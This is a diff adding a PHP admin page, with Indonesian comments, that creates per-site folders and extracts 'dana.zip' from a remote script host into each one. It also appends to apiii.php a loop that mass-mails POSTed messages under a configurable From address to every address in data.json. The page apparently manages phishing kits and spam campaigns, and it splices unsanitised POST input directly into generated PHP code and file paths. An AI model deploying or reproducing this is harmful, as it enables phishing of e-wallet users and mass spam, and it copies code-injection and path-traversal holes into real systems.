@@ -1,0 +1,208 @@
+<?php
+include "setting.php";
+// Fungsi untuk mendapatkan data pengguna dari file dan mengembalikan array
+function getUsersData()
+{
+    $dataFile = "users_data.txt";
+    if (file_exists($dataFile)) {
+        $data = file_get_contents($dataFile);
+        return unserialize($data);
+    }
+    return array();
+}
+
+// Fungsi untuk menyimpan data pengguna ke dalam file
+function saveUsersData($data)
+{
+    $dataFile = "rxluser.txt";
+    $serializedData = serialize($data);
+    file_put_contents($dataFile, $serializedData);
+}
+
+// Fungsi untuk menambahkan WEB baru ke dalam array users
+function tambahWEBBaru($WEB, $folderName)
+{
+    $users = getUsersData();
+
+    // Cek apakah WEB sudah ada dalam daftar user
+    if (array_key_exists($WEB, $users)) {
+        return false; // WEB sudah ada
+    } else {
+        // Tambahkan WEB baru ke array users dengan folder baru yang dibuat
+        $users[$WEB] = $folderName;
+
+        // Simpan perubahan array users ke dalam file
+        saveUsersData($users);
+
+        return true; // WEB berhasil ditambahkan
+    }
+}
+
+// Fungsi untuk menambahkan code ke file apiii.php
+function tambahCodeKeApiii($folderName)
+{
+    $apiiiFile = "apiii.php";
+    $codeToAdd = '
+    
+$subjek = $_POST[\'subjek\'];
+$pesan = $_POST[\'pesan\'];
+
+include \'' . $folderName . '/data.php\';
+$sender = \'From: \'.$nik.\'<\'.$sender.\'>\';
+$headers  = \'MIME-Version: 1.0\' . "\r\n";
+$headers .= \'Content-type: text/html; charset=iso-8859-1\' . "\r\n";
+$headers .= \'\' . $sender . \'\' . "\r\n";
+
+$read = file_get_contents(\'' . $folderName . '/data.json\');
+$json = json_decode($read,true);
+
+for($i=0;$i<=count($json) - 1;$i++)
+{
+mail($json[$i][\'email\'], $subjek, $pesan, $headers);
+}';
+
+    // Baca isi file apiii.php
+    $apiiiContent = file_get_contents($apiiiFile);
+
+    // Tambahkan code ke dalam apiii.php
+    $apiiiContent .= "\n\n" . $codeToAdd;
+
+    // Simpan kembali isi file apiii.php
+    file_put_contents($apiiiFile, $apiiiContent);
+}
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $WEB = $_POST["WEB"];
+    $randomNumber = rand(1000, 9999);
+    $folderName = $WEB . "_" . $randomNumber;
+
+    if (tambahWEBBaru($WEB, $folderName)) {
+        $ptFolderPath = $folderName; // Menghapus "pt/" dari path
+
+        if (!file_exists($ptFolderPath) && mkdir($ptFolderPath, 0777, true)) {
+            $zipPath = $api . "/apiku/scriptku/12/dana.zip";
+            $zip = new ZipArchive;
+            if ($zip->open($zipPath) === TRUE) {
+                if ($zip->extractTo($ptFolderPath)) {
+                    $successMessage = "WEB baru berhasil ditambahkan. Folder dan file berhasil dibuat.";
+                    tambahCodeKeApiii($folderName);
+                } else {
+                    $errorMessage = "Gagal mengekstrak file zip.";
+                }
+                $zip->close();
+            } else {
+                $errorMessage = "Gagal membuka file zip.";
+            }
+        } else {
+            $errorMessage = "Gagal membuat folder baru atau folder sudah ada.";
+        }
+    } else {
+        $errorMessage = "WEB sudah ada.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Tambah WEB Baru</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input[type="submit"] {
+            padding: 10px 20px;
+            background-color: #337ab7;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #23527c;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+            position: relative;
+        }
+
+        .container p {
+            margin: 0;
+            padding: 10px;
+        }
+
+        .container::before {
+            content: "";
+            position: absolute;
+            border: 3px solid transparent;
+            border-radius: 8px;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            z-index: -1;
+            animation: border-animation 4s infinite linear;
+        }
+
+        .success {
+            color: green;
+        }
+
+        .error {
+            color: red;
+        }
+
+        @keyframes border-animation {
+            0%, 100% {
+                border-color: red;
+            }
+            50% {
+                border-color: white;
+            }
+        }
+    </style>
+</head>
+<body>
+    <form method="post" action="cekweb.php">
+        <input type="submit" value="LOGIN">
+    </form>
+    <div class="container">
+        <?php
+        if (isset($successMessage)) {
+            echo '<p class="success">' . $successMessage . '</p>';
+        } elseif (isset($errorMessage)) {
+            echo '<p class="error">' . $errorMessage . '</p>';
+        }
+        ?>
+    </div>
+</body>
+</html>
